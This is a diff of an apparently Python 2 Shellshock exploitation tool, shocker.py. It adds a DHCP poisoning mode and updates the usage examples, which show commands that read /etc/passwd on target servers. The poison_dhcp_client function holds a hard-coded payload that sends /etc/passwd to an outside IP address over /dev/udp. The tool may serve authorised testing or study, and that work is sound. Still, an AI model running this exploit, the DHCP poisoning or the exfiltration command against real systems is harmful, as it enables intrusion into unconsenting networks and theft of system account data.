@@ -16,15 +16,19 @@ A tool to find and exploit webservers vulnerable to Shellshock
 ##############################################################################
 
 Usage examples:
-./shocker.py -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
+./shocker.py -M dhcp
+Default dhcp attack - listens for Discover/Request/Info messages and returns 
+poisoned responses
+
+./shocker.py -M http -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
 Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
 /etc/passwd
 
-./shocker.py -H www.example.com -p 8001 -s
+./shocker.py -M http -H www.example.com -p 8001 -s
 Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
 attempts the default exploit for any found
 
-./shocker.py -f iplist
+./shocker.py -M http -f iplist
 Scans all hosts specified in the file ./iplist with default options
 
 Read the README for more details
@@ -799,7 +803,7 @@ def poison_dhcp_client(pkt, request_type, requested_params):
     """Send poisoned response to the client
     """
     command = "/bin/cat /etc/passwd>/dev/udp/57.57.57.57/5757"
-    print "DEBUG Here in poinson" 
+    print "DEBUG Here in poison" 
     if request_type == "DHCPDISCOVER":
         print "DEBUG: Sending DISCOVER response"
         print "pkt[Ether].src = %s" % str(pkt[Ether].src)
